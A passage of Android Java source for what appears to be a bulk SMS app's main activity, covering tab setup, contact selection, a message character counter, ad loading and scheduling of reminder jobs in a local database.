                        strBtnText += String.valueOf(dsdttmpick.getMonth()) + "-";
                        strBtnText += String.valueOf(dsdttmpick.getYear()) + ", ";
                        strBtnText += String.valueOf(dsdttmpick.getHh()) + ":";
                        strBtnText += String.valueOf(dsdttmpick.getMm());

                        btn_bulksms = (Button)findViewById(R.id.imgbtn_SendBulkSMS);
                        btn_bulksms.setText(strBtnText);


                    }catch (Exception ex){
                        Log.e("Bulk SMS: ", "MainActivity.java:initSMSReminderTab() caught exception");
						ex.printStackTrace();
                    }

                    radbtn_set_reminder.setChecked(true);                   // set the radio button as selected.
                    getSupportActionBar().setSelectedNavigationItem(0);     // go to bulk sms tab
                }
            });


            Button btnSetScheduleCancel = (Button)localView.findViewById(R.id.btn_cancelReminder);
            btnSetScheduleCancel.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    getSupportActionBar().setSelectedNavigationItem(0);     // Return to Bulk SMS Tab
                }
            });


        }

        private void initAboutAppTab(View localView) {

            //////////// Add to Fragment ///////////////
            FragmentManager manager = getSupportFragmentManager();
            FragmentTransaction transaction = manager.beginTransaction();
            Fragment fragment = new Fragment();
            transaction.add(R.id.container_about_app, fragment);
            transaction.commit();
            ////////////////////////////////////////////

            if(getResources().getInteger(R.integer.host_ads)==1) {
                // Invoke AdView
                AdView mAdView = (AdView) localView.findViewById(R.id.adView_about_app_tab);
                AdRequest adRequest = new AdRequest.Builder().build();
                mAdView.loadAd(adRequest);
            }

            AboutApp objAbtApp = new AboutApp(MainActivity.this);

            lbl_version_number = (TextView)localView.findViewById(R.id.lbl_app_version_number);
            lbl_version_number.setText(objAbtApp.getVersionNumber());


            lbl_version_history = (TextView)localView.findViewById(R.id.lbl_app_version_history);
            lbl_version_history.setText(objAbtApp.getVersionHistory());

            lbl_about_app = (TextView)localView.findViewById(R.id.lbl_app_about);
            lbl_about_app.setText(objAbtApp.getAboutApp());

        }


        private void initSendBulkSMSTab(View localView) {

            //////////// Add to Fragment ///////////////
            FragmentManager manager = getSupportFragmentManager();
            FragmentTransaction transaction = manager.beginTransaction();
            Fragment fragment = new Fragment();
            transaction.add(R.id.container_send_bulk_sms, fragment);
            transaction.commit();
            ////////////////////////////////////////////

            if(getResources().getInteger(R.integer.host_ads)==1) {
                // Invoke AdView
                AdView mAdView = (AdView) localView.findViewById(R.id.adView_send_bulk_sms_tab);
                AdRequest adRequest = new AdRequest.Builder()
                        //.addTestDevice(String.valueOf(R.string.test_device_id))
                        .build();
                mAdView.loadAd(adRequest);
            }


            lv_PhnNums = (ListView)localView.findViewById(R.id.listView_PhnNums);
            lv_PhnNums.setLongClickable(true);

//            lv_PhnNums.setOnClickListener(new View.OnClickListener() {
//                @Override
//                public void onClick(View view) {
//                    invokeContactBookActivity();
//                }
//            });

            // This code allows ListView to scroll even when ListView is inside a ScrollView
            lv_PhnNums.setOnTouchListener(new View.OnTouchListener() {
                // Setting on Touch Listener for handling the touch inside ScrollView
                @Override
                public boolean onTouch(View v, MotionEvent event) {
                    // Disallow the touch request for parent scroll on touch of child view
                    v.getParent().requestDisallowInterceptTouchEvent(true);
                    return false;
                }
            });

            lv_PhnNums.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
                @Override
                public boolean onItemLongClick(AdapterView<?> adapterView, View view, int position, long l) {

                    Context cntx = getActivity(); //getBaseContext(); //getApplication();
                    final CharSequence[] items = {"Delete", "Cancel"};
                    final int pos = position;


                    AlertDialog.Builder builder = new AlertDialog.Builder(cntx);
                    builder.setIcon(R.drawable.bulksmsapplogo);
                    builder.setCancelable(true);
                    builder.setTitle("Action:");


                    builder.setItems(items, new DialogInterface.OnClickListener() {
                        public void onClick(DialogInterface dialog, int item) {
                            //String strPhnRec = (String) lv_PhnNums.getItemAtPosition(position);

                            switch (item) {

                                case 0: // "Delete"
                                    mContactsSelectedList.remove(pos);
                                    mContactsSelectedAdapter = getContactsSelectedAdapter();
                                    mContactsSelectedAdapter.notifyDataSetChanged();
                                    //lv_PhnNums.setAdapter(mContactsSelectedAdapter);
                                    //mContactsSelectedAdapter.notifyDataSetChanged();
                                    break;

                                case 1: // "Cancel"
                                    closeContextMenu();
                                    break;
                            }
                        }
                    });

                    AlertDialog alert = builder.create();
                    alert.show();

                    return false;
                }
            });


            // Send bulk sms button
            btn_bulksms = (Button)localView.findViewById(R.id.imgbtn_SendBulkSMS);
            btn_bulksms.setOnClickListener(this);

            // Select contacts button
            imgbtn_selectcontacts = (ImageButton)localView.findViewById(R.id.imgbtn_SelectContacts);
            imgbtn_selectcontacts.setOnClickListener(this);


            lbl_sms_char_counter = (TextView)localView.findViewById(R.id.lbl_SMSCharCount);

            // Adding a text watcher to SMS text box
            // (How text changes in text box should behave).
            et_sms_msg = (EditText) localView.findViewById(R.id.et_SMS_msg);
            et_sms_msg.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

                }

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {
                    //This sets a textview to the current length
                    String smsNo;
                    if(charSequence.length() == 0)
                        smsNo = "0";
                    else
                        smsNo = String.valueOf(charSequence.length()/160 + 1);

                    String smsLength = String.valueOf(160-(charSequence.length()%160));
                    lbl_sms_char_counter.setText(smsLength+"/"+smsNo);
                }

                @Override
                public void afterTextChanged(Editable editable) {

                }
            });

            // Radio Button Group and its member radio buttons
            radgrp = (RadioGroup)localView.findViewById(R.id.radgrp_reminder);
            radbtn_set_reminder = (RadioButton)localView.findViewById(R.id.radbtn_setreminder);
            radbtn_set_reminder.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {

                    // Code to shift to 'Set Reminder' tab.
                    radbtn_set_reminder.setChecked(true);
                    getSupportActionBar().setSelectedNavigationItem(1); // go to set reminder tab
                }
            });

            radbtn_now = (RadioButton)localView.findViewById(R.id.radbtn_sendnow);
            radbtn_now.setChecked(true);
            radbtn_now.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    // Nothing needs to be done i guess for this
                    radbtn_now.setChecked(true);
                    btn_bulksms.setText(R.string.btn_bulksms_send_now_text);
                }
            });




//            radgrp.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
//                @Override
//                public void onCheckedChanged(RadioGroup radioGroup, int checked_id) {
//                    switch (checked_id){
//                        case R.id.radbtn_sendnow:
//                            // Nothing needs to be done i guess for this
//                            radbtn_now.setChecked(true);
//                            break;
//
//                        case R.id.radbtn_setreminder:
//                            // Code to shift to 'Set Reminder' tab.
//                            radbtn_set_reminder.setChecked(true);
//                            getSupportActionBar().setSelectedNavigationItem(1); // go to set reminder tab
//
//                            break;
//                    }
//                }
//            });

        }

        @Override
        public void onClick(View view) {
            int id = view.getId();

            switch (id){

                case R.id.imgbtn_SelectContacts:
                    // Display msg for "Loading Contact Details..."
//                    try{
//                        LayoutInflater inflater = getLayoutInflater(new Bundle());
//
//                        View layout = inflater.inflate(R.layout.custom_toast_msg,
//                                (ViewGroup) findViewById(R.id.LinearLayout_ToastMsg));
//
//                        Toast tstmsg = new Toast(MainActivity.this);
//                        tstmsg.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
//                        tstmsg.setView(layout);
//                        tstmsg.makeText(getBaseContext(), "Reading Contact Records...Please Wait.", Toast.LENGTH_LONG);
//                        tstmsg.show();
//                    }catch (Exception ex){
//                        Log.e("Bulk SMS", "MainActivity.java:onClick() - case R.id.imgbtn_SelectContacts caught exception");
//					ex.printStackTrace();
//                    }

                    //Toast.makeText(MainActivity.this, "Reading Contact Records...Please Wait.", Toast.LENGTH_LONG).show();
                    invokeContactBookActivity();
                    break;

                case R.id.imgbtn_SendBulkSMS:
                    ComposeAndSendMessage();
                    break;

            }
        }
    }

    private String create_job_task(int totalPhoneNumbers, String smsMesg) {

        //String[] phoneContacts = new String[totalPhoneNumbers];
        String phoneContacts = "";

        // Extract the phone numbers
        for(int i=0; i < totalPhoneNumbers; i++ ) {
            // Get first phone number string from List View
            String phoneNumber = (String) lv_PhnNums.getItemAtPosition(i);
            // The phoneNumber string contains "Name <phone number>".
            // Hence we need to extract only the numbers between '<' & '>'
//            int startIndex = phoneNumber.indexOf('<');
//            int endIndex = phoneNumber.indexOf('>');
//            // startIndex+1 , because we need to capture from next character after '<'
//            phoneNumber = phoneNumber.substring(startIndex + 1, endIndex);

            // Add numbers to a local variable.
            // Add '<' '>' for easy parsing
//            phoneContacts = "<";
            phoneContacts  += phoneNumber;
//            phoneContacts = ">";

            // Add Delimiter comma
            phoneContacts  += ", ";
        }

        // Create a jobid from date selected (to be passed in the intent
        String jobid_from_date = dsdttmpick.getYear() + dsdttmpick.getMonth() + dsdttmpick.getDay() + dsdttmpick.getHh() + dsdttmpick.getMm();

        // Set an alarm and a notification to be raised when alarm goes off
        dsdttmpick.setMessageReminder(scheduleClient, jobid_from_date);

        // Create a JobID record in database
        bulksmsdb.insertNewJob(jobid_from_date, phoneContacts, smsMesg);

        return jobid_from_date;
    }


    public DBHelper getBulkSMSDBobj(){
        return bulksmsdb;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == RC_OPEN_CONTACTBOOK_ACT) {
            if (resultCode == RESULT_OK) {
                // code for result

                ArrayList<PhoneBookRowItem> mContactsSelected = data.getParcelableArrayListExtra("SelectedContacts");
                int size = mContactsSelected.size();

                // Code for free version of app. Limiting the max recipients in free version
                if(getResources().getInteger(R.integer.free_version_code)==1){
                    if(size >= 5)
                        display_toast("Bulk SMS(Free Version) supports max of 5 recipients. \nList truncated to first 5 recipients.");

                    // If there is a limit set on max number of users in Free version
                    size = (size < 5) ? size : getResources().getInteger(R.integer.max_recipients);
                }

                // Create a temp array-list to from array-list obtained from another activity.
                mContactsSelectedList = new ArrayList<String>();
                for(int i=0; i < size; i++){
                        PhoneBookRowItem rowItem = mContactsSelected.get(i);
                        mContactsSelectedList.add(rowItem.getPhoneUserName() + "  <" + rowItem.getPhoneNumber() + ">");
                }
                // Use mContactsSelectedList to create an adapter to be used to fill the list view.
                mContactsSelectedAdapter = new ArrayAdapter<String>(getBaseContext(), android.R.layout.simple_list_item_1, mContactsSelectedList);
                lv_PhnNums.setAdapter(mContactsSelectedAdapter);


            }

            if (resultCode == RESULT_CANCELED) {
                // Write your code on no result return

            }
        }
    }

    public ArrayAdapter<String> getContactsSelectedAdapter(){
        return mContactsSelectedAdapter;
    }


    private int RC_OPEN_CONTACTBOOK_ACT = 10;

    private void invokeContactBookActivity() {
        Intent startContactBookAct = new Intent(this, ContactBook.class);
        startActivityForResult(startContactBookAct, RC_OPEN_CONTACTBOOK_ACT);
    }
}

